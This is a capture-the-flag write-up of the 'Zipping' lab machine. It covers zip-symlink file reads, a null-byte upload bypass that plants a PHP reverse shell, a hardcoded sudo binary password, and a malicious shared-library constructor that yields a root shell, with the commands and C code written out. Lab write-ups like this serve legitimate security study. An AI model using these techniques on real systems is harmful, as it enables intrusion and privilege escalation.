# Zipping

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 3000 10.129.114.241         
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-27 17:27 +08
Nmap scan report for 10.129.114.241
Host is up (0.17s latency).
Not shown: 64643 closed tcp ports (conn-refused), 890 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Did a detailed scan as well:

```
$ nmap -p 80 -sC -sV --min-rate 4000 10.129.114.241
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-27 17:28 +08
Nmap scan report for 10.129.114.241
Host is up (0.17s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.54 ((Ubuntu))
|_http-title: Zipping | Watch store
|_http-server-header: Apache/2.4.54 (Ubuntu)
```

We don't need to add a domain to visit this site. I still added `zipping.htb` as standard HTB practice.

### Web Enumeration -> Zip File LFI

The website was a watch store:

<figure><img src="../../.gitbook/assets/image (4170).png" alt=""><figcaption></figcaption></figure>

There is a shop feature located on the site, which was rather uninteresting except for the URL itself:

<figure><img src="../../.gitbook/assets/image (4173).png" alt=""><figcaption></figcaption></figure>

The `page` parameter was a really obvious LFI. The page is based in PHP, so I assumed that this was loading `products.php`. If we can figure out how to upload a shell on the machine like `rev.php`, it would potentially have to be triggered using this. All theory here, I have no source code yet.&#x20;

The 'Work with Us' part was rather interesting:

<figure><img src="../../.gitbook/assets/image (4171).png" alt=""><figcaption></figcaption></figure>

This is quite specific in terms of requirements, and while there is technically a CVE out there for this (CVE-2023-38831), I think it's a bit too new for this box which just came out.

Since we are allowed to specify whatever file we want, we could potentially create symlinks to exploit an LFI:

{% embed url="https://effortlesssecurity.in/zip-symlink-vulnerability/" %}

I created a symlink called `test.pdf` that pointed to `/etc/passwd`, since we need to have a PDF file within the zip. Then I created a zip file with the symlink:

```bash
ln -s ../../../../../../../../../../../etc/passwd test.pdf
zip -r --symlinks test.zip test.pdf
```

This would generate a file for us:

<figure><img src="../../.gitbook/assets/image (4172).png" alt=""><figcaption></figcaption></figure>

It should be noted that the hash in the URL is just the MD5 hash of the `test.zip` file.&#x20;

```
$ md5sum test.zip
4d65013aaa40f2fcdf55bb7b710f899f  test.zip
```

However, visiting it shows an empty page. When the requests are viewed through Burp however, it shows that it worked!

<figure><img src="../../.gitbook/assets/image (4176).png" alt=""><figcaption></figcaption></figure>

### SQL Injection Fail

Using this, we can read whatever file we want. The first thing I want to read is the `upload.php` file located at `/var/www/html/upload.php`:

```php
<?php
            if(isset($_POST['submit'])) {
              // Get the uploaded zip file
              $zipFile = $_FILES['zipFile']['tmp_name'];
              if ($_FILES["zipFile"]["size"] > 300000) {
                echo "<p>File size must be less than 300,000 bytes.</p>";
              } else {
                // Create an md5 hash of the zip file
                $fileHash = md5_file($zipFile);
                // Create a new directory for the extracted files
                $uploadDir = "uploads/$fileHash/";
                // Extract the files from the zip
                $zip = new ZipArchive;
                if ($zip->open($zipFile) === true) {
                  if ($zip->count() > 1) {
                  echo '<p>Please include a single PDF file in the archive.<p>';
                  } else {
                  // Get the name of the compressed file
                  $fileName = $zip->getNameIndex(0);
                  if (pathinfo($fileName, PATHINFO_EXTENSION) === "pdf") {
                    mkdir($uploadDir);
		    echo exec('7z e '.$zipFile. ' -o' .$uploadDir. '>/dev/null');
                    echo '<p>File successfully uploaded and unzipped, a staff member will review your resume as soon as possible. Make sure it has been uploaded correctly by accessing the following path:</p><a href="'.$uploadDir.$fileName.'">'.$uploadDir.$fileName.'</a>'.'</p>';
                  } else {
                    echo "<p>The unzipped file must have  a .pdf extension.</p>";
                  }
                 }
                } else {
                  echo "Error uploading file.";
                }

              }
            }
            ?>
```

The next thing to read is the code for the shop.&#x20;

{% code overflow="wrap" %}
```php
<?php
session_start();
// Include functions and connect to the database using PDO MySQL
include 'functions.php';
$pdo = pdo_connect_mysql();
// Page is set to home (home.php) by default, so when the visitor visits, that will be the page they see.
$page = isset($_GET['page']) && file_exists($_GET['page'] . '.php') ? $_GET['page'] : 'home';
// Include and show the requested page
include $page . '.php';
?>
```
{% endcode %}

There's an LFI above with an auto `.php` extension includer. The `include` function is also used, which would execute PHP code if it exists. This opens up the door to RCE exploits via a PHP file.

The above mentions a `functions.php`, which contains some more interesting stuff:

```php
<?php
function pdo_connect_mysql() {
    // Update the details below with your MySQL details
    $DATABASE_HOST = 'localhost';
    $DATABASE_USER = 'root';
    $DATABASE_PASS = 'MySQL_P@ssw0rd!';
    $DATABASE_NAME = 'zipping';
<TRUNCATED>
```

This password does not work for `ssh` however. Reading `home.php` also had a bit of interesting stuff:

{% code overflow="wrap" %}
```php
<?php
// Get the 4 most recently added products
$stmt = $pdo->prepare('SELECT * FROM products ORDER BY date_added DESC LIMIT 4');
$stmt->execute();
$recently_added_products = $stmt->fetchAll(PDO::FETCH_ASSOC);
?>
<?=template_header('Zipping | Home')?>
<div class="featured">
    <h2>Watches</h2>
    <p>The perfect watch for every occasion</p>
</div>
<div class="recentlyadded content-wrapper">
    <h2>Recently Added Products</h2>
    <div class="products">
        <?php foreach ($recently_added_products as $product): ?>
        <a href="index.php?page=product&id=<?=$product['id']?>" class="product">
            <img src="assets/imgs/<?=$product['img']?>" width="200" height="200" alt="<?=$product['name']?>">
            <span class="name"><?=$product['name']?></span>
            <span class="price">
                &dollar;<?=$product['price']?>
                <?php if ($product['rrp'] > 0): ?>
                <span class="rrp">&dollar;<?=$product['rrp']?></span>
                <?php endif; ?>
            </span>
        </a>
        <?php endforeach; ?>
    </div>
</div>
```
{% endcode %}

The above does not have any input validation for the `id` parameter, which is user-controlled.&#x20;

When we attempt SQL Injection via `'` character within the shop and render it in Burp, we see this:

<figure><img src="../../.gitbook/assets/image (4177).png" alt=""><figcaption></figcaption></figure>

This confirms that SQL Injection works. This, combined with the LFI trigger through `includes`, gives us a clear exploit path. However, I wanted to enumerate where the `id` parameter was being processed. Running a quick `gobuster` scan shows that `product.php` exists:

```
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://zipping.htb/shop/ -x php
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://zipping.htb/shop/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2023/08/27 18:30:40 Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 276]
/index.php            (Status: 200) [Size: 2615]
/home.php             (Status: 500) [Size: 0]
/products.php         (Status: 500) [Size: 0]
/product.php          (Status: 200) [Size: 15]
```

We can then use our PDF LFI to read this:

```php
<?php
// Check to make sure the id parameter is specified in the URL
if (isset($_GET['id'])) {
    $id = $_GET['id'];
    // Filtering user input for letters or special characters
    if(preg_match("/^.*[A-Za-z!#$%^&*()\-_=+{}\[\]\\|;:'\",.<>\/?]|[^0-9]$/", $id, $match)) {
        header('Location: index.php');
    } else {
        // Prepare statement and execute, but does not prevent SQL injection
        $stmt = $pdo->prepare("SELECT * FROM products WHERE id = '$id'");
        $stmt->execute();
        // Fetch the product from the database and return the result as an Array
        $product = $stmt->fetch(PDO::FETCH_ASSOC);
        // Check if the product exists (array is not empty)
        if (!$product) {
            // Simple error to display if the id for the product doesn't exists (array is empty)
            exit('Product does not exist!');
        }
    }
} else {
    // Simple error to display if the id wasn't specified
    exit('No ID provided!');
}
?>
```

The regex there looks quite hard to bypass, and combined with the fact that the box name is Zipper, it's obvious that this isn't the intended method.&#x20;

### Null Byte Bypass -> RCE&#x20;

SQL Injection failed, so it's back to the Zip file method. This is the code that checks whether or not there's a valid file in the zip:

```php
$zip = new ZipArchive;
    if ($zip->open($zipFile) === true) {
      if ($zip->count() > 1) {
      echo '<p>Please include a single PDF file in the archive.<p>';
      } else {
      // Get the name of the compressed file
      $fileName = $zip->getNameIndex(0);
      if (pathinfo($fileName, PATHINFO_EXTENSION) === "pdf") {
        mkdir($uploadDir);
        echo exec('7z e '.$zipFile. ' -o' .$uploadDir. '>/dev/null');
        echo '<p>File successfully uploaded and unzipped, a staff member will review your resume as soon as possible. Make sure it has been uploaded correctly by accessing the following path:</p><a href="'.$uploadDir.$fileName.'">'.$uploadDir.$fileName.'</a>'.'</p>';
      } else {
        echo "<p>The unzipped file must have  a .pdf extension.</p>";
        }
```

The only check present is the `pathinfo` function, of which it can be bypassed.&#x20;

{% embed url="https://forums.hak5.org/topic/39958-bypassing-pathinfo-or-getimagesize-php-shell-upload/" %}

<figure><img src="../../.gitbook/assets/image (4179).png" alt=""><figcaption><p>From PayloadAllTheThings</p></figcaption></figure>

To exploit this, we need to somehow append a null byte to the contents of the zip file, since we cannot just include it in the name of the file. I took a PHP reverse shell and zipped it to find that the file name is included in the strings of a the zip file.

```
$ strings test.zip
k@As
rev.phpUT
```

Perhaps we could directly put the null byte within the zip file. Using `hexeditor`, I was able to edit it to this:

<figure><img src="../../.gitbook/assets/image (4180).png" alt=""><figcaption></figcaption></figure>

This would include the null byte needed to bypass the `pathinfo` function. When uploaded, this is what we see:

<figure><img src="../../.gitbook/assets/image (4181).png" alt=""><figcaption></figcaption></figure>

We can then visit that site and get a shell (without the `.pdf` at the end):

<figure><img src="../../.gitbook/assets/image (4182).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Sudo Privileges -> Stock Binary&#x20;

When checking `sudo` privileges, this is what I see:

```
rektsu@zipping:/home/rektsu$ sudo -l
Matching Defaults entries for rektsu on zipping:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User rektsu may run the following commands on zipping:
    (ALL) NOPASSWD: /usr/bin/stock
```

There's a custom binary that we can run as `root`. Running it requires a password:

```
rektsu@zipping:/home/rektsu$ /usr/bin/stock
Enter the password: hello
Invalid password, please try again.
```

I transferred the binary to my machine and ran `ltrace` on it:

```
$ ltrace ./stock                                                               
printf("Enter the password: ")                           = 20
fgets(Enter the password: w
"w\n", 30, 0x7f65b06dfa80)                         = 0x7ffd0031b2b0
strchr("w\n", '\n')                                      = "\n"
strcmp("w", "St0ckM4nager")                              = 36
puts("Invalid password, please try aga"...Invalid password, please try again.
)              = 36
+++ exited (status 1) +++
```

After using the correct password, we have some options:

```
$ ./stock 
Enter the password: St0ckM4nager

================== Menu ==================

1) See the stock
2) Edit the stock
```

When we view these options in `ltrace`, we can see that it attempts to open a `.csv` file:

```
$ ltrace ./stock
printf("Enter the password: ")                           = 20
fgets(Enter the password: St0ckM4nager
"St0ckM4nager\n", 30, 0x7f8ba50f3a80)              = 0x7ffc66ff64b0
strchr("St0ckM4nager\n", '\n')                           = "\n"
strcmp("St0ckM4nager", "St0ckM4nager")                   = 0
dlopen("/home/rektsu/.config/libcounter."..., 1)         = 0

__isoc99_scanf(0x5591eb1050e0, 0x7ffd00dd750c, 0, 0Select an option: 1
)     = 1
fopen("/root/.stock.csv", "r")

printf("Select an option: ")                             = 18
__isoc99_scanf(0x55afb8f3c0e0, 0x7ffc66ff64dc, 0, 0Select an option: 2
)     = 1
fopen("/root/.stock.csv", "r")
```

When running on the machine itself, this is what we get:

```
Select an option: 1

================== Stock Actual ==================

Colour     Black   Gold    Silver
Amount     5       15      5      

Quality   Excelent Average Poor
Amount    5         15      5   

Exclusive Yes    No
Amount    5      19  

Warranty  Yes    No
Amount    5      19

Select an option: 2

================== Edit Stock ==================

Enter the information of the watch you wish to update:
Colour (0: black, 1: gold, 2: silver): 0
Quality (0: excelent, 1: average, 2: poor): 0
Exclusivity (0: yes, 1: no): 0
Warranty (0: yes, 1: no): 0
Amount: 1
The stock has been updated correctly.
```

### Shared Library Exploit -> Root

The `ltrace` output from earlier shows this:

```
$ ltrace ./stock
printf("Enter the password: ")                           = 20
fgets(Enter the password: St0ckM4nager
"St0ckM4nager\n", 30, 0x7f8ba50f3a80)              = 0x7ffc66ff64b0
strchr("St0ckM4nager\n", '\n')                           = "\n"
strcmp("St0ckM4nager", "St0ckM4nager")                   = 0
dlopen("/home/rektsu/.config/libcounter."..., 1)         = 0
```

There's a `libcounter` file being loaded, which is likely a Shared Object file (`.so`). Since we have control over one file, we can easily create some basic C code that will trigger upon loading the library to give us a `root` shell.

{% embed url="https://tbhaxor.com/exploiting-shared-library-misconfigurations/" %}

Here's the C code I used based on the resource above:

```c
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
void method()__attribute__((constructor));
void method() {
    system("/bin/bash -i");
}
```

Since we are already running this using `sudo`, no need to use `setuid` or `setgid`. Afterwards, compile it using this and download it to the `/home/rektsu/.config` file:

```bash
gcc -shared -fPIC -nostartfiles -o libcounter.so exploit.c
```

Then, we can run `stock` to get a `root` shell:

<figure><img src="../../.gitbook/assets/image (4183).png" alt=""><figcaption></figcaption></figure>

Rooted!
